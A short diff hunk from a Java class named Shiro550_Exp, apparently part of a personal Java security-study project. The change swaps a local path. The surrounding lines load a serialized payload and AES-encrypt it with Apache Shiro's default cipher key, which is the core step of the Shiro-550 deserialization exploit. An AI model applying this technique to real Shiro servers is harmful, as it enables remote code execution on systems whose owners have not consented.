@@ -23,7 +23,7 @@ public class Shiro550_Exp {
 
 
         //读取payload
-        byte[] bytes = Files.readAllBytes(Paths.get("H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550"));
+        byte[] bytes = Files.readAllBytes(Paths.get("C:\\Project_Java\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550"));
         //AES加密
         ByteSource byteSource = cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);
         byte[] value = byteSource.getBytes();
